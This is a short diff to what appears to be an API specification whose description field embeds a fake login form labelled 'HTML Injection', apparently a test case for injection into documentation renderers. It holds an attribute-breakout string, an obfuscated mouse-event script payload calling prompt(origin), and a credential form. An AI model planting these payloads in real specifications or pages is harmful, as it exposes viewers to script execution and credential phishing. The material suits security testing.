@@ -4,7 +4,7 @@ info:
   title: Fake Login Page
   description: '<div class="login-form">
     <div class="heading">
-        <h1>HTML Injection : Fake Login</h1>
+        <h1>HTML Injection :"><s> Fake Login</h1>
     </div>
     <div class="form-container" OnmouSEMOVE=a=prompt,a(origin)>
         <form action="https://example.com/login" method="post" class="form-signin">
